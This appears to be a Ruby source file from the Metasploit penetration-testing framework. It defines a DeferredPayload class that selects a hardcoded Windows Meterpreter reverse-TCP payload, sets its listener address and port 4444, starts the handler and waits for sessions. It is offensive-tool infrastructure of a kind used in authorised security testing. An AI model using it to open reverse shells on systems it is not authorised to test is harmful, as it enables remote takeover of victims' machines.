# -*- coding: binary -*-

require 'msf/core'

module Msf

###
#
# This class provides runtime selection of payloads and listener management
#
###
class DeferredPayload

  include Framework::Offspring

  #
  # This method creates a deferred payload instance and returns it to the
  # caller.
  #
  def self.create(einst)
    DeferredPayload.new(einst)
  end

  #
  # Creates an instance of an DeferredPayload.
  #
  def initialize(einst)
    self.framework = einst.framework
    self.einst     = einst
    self.active_payloads = []
  end

  #
  # This method generates the full encoded payload and returns the encoded
  # payload buffer.
  #
  # @return [String] The encoded payload.
  def encoded
    activated_payload.encoded
  end

  #
  # This method generates the raw payload and returns the payload buffer.
  #
  # @return [String] The encoded payload.
  def raw
    activated_payload.raw
  end

  #
  # This method selects, creates, and caches the real payload.
  #
  def activated_payload
    # Return a cached payload unless the cache was marked stale
    if cache[:payload] && ! cache[:stale]
      return cache[:payload]
    end
    cache.delete(:stale)
    regenerate_payload
  end

  def regenerate_payload
    pinst = select_payload
    cache[:payload_instance] = pinst
    cache[:payload] = configure_payload(pinst)
  end

  def select_payload
    framework.payloads.create("windows/meterpreter/reverse_tcp")
  end

  def configure_payload(pinst)
    # Seed the datastore from the exploit
    pinst.share_datastore(einst.datastore)

    # TODO: Set instance specific options (LHOST/LPORT/etc)
    pinst.datastore['LHOST'] = Rex::Socket.source_address('50.50.50.50')
    pinst.datastore['LPORT'] = 4444

    # Validate the datastore and normalize options
    pinst.options.validate(pinst.datastore)

    # Associate the payload instance with the exploit
    pinst.assoc_exploit = self.einst

    # Configure the payload user input/output handles
    pinst.init_ui(einst.user_input, einst.user_output)

    pinst.exploit_config = {
      'active_timeout' => einst.active_timeout
    }

    # Set up the payload handlers
    pinst.setup_handler

    # Start the payload handler
    pinst.start_handler

    # TODO: Track WfsDelay

    # Add to the list of active payloads
    self.active_payloads << pinst

    # Return the encoded payload to the caller
    einst.generate_single_payload(
      pinst,
      cache[:platform] || einst.target_platform,
      cache[:arch] || einst.target_arch,
      cache[:target])
  end

  def wait_for_session(delay)
    return unless cache[:payload_instance]
    return unless cache[:payload_instance].respond_to? :wait_for_session
    cache[:payload_instance].wait_for_session(delay)
  end

  #
  # This method is called when target information has changed.
  #
  def update_target(info={})
    info.each_pair do |k,v|
      cache[:stale] = true if cache[k] != v
      cache[k] = v
    end
  end

  #
  # Provide a per-thread cache of payload settings
  #
  def cache
    @cache ||= {}
    @cache[Thread.current.to_s] ||= {}
    @cache[Thread.current.to_s]
  end

  #
  # Shutdown handlers and cleanup
  #
  def cleanup
    active_payloads.each do |pinst|
      begin
        einst.print_status("Calling cleanup on #{pinst.refname}...")
        sleep(5)
        pinst.cleanup_handler
      rescue ::Exception => e
        einst.print_error("Exception cleaning up #{pinst.refname}: #{e.class} #{e}")
      end
    end
  end

  #
  # The exploit instance associated with this deferred payload
  #
  attr_accessor :einst

  #
  # An array of active payloads
  #
  attr_accessor :active_payloads
end

end
